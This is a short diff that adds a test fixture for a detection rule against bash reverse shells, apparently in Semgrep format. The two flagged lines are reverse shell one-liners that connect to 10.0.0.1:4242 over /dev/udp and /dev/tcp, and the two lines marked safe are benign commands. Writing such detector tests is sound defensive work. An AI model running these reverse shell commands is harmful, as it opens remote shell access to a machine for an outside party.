@@ -1,0 +1,9 @@
+# Bash reverse shells phoning out over /dev/tcp or /dev/udp.
+# ruleid: bash_reverse_shell
+sh -i >& /dev/udp/10.0.0.1/4242 0>&1
+# ruleid: bash_reverse_shell
+<x >/dev/tcp/10.0.0.1/4242; sh <&3 >&3 2>&3
+# ok: bash_reverse_shell
+echo hello from ci
+# ok: bash_reverse_shell
+ssh -i key.pem user@example.com
